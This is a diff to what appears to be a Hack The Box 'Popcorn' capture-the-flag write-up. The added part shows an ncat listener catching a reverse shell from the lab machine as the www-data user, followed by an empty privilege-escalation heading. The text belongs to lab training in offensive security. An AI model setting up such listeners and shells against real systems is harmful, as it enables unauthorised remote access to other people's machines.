@@ -146,6 +146,25 @@ reverse shell payload.
 
 send the payload and check back ncat listener.
 
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Popcorn]
+└─$ ncat -lnvp 445                                            
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::445
+Ncat: Listening on 0.0.0.0:445
+Ncat: Connection from 10.10.10.6.
+Ncat: Connection from 10.10.10.6:42739.
+bash: no job control in this shell
+www-data@popcorn:/var/www/torrent/upload$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@popcorn:/var/www/torrent/upload$ 
+```
+bingo we got a reverse shell...
+
+
+## Privilege Escalation 
+
 
 
 
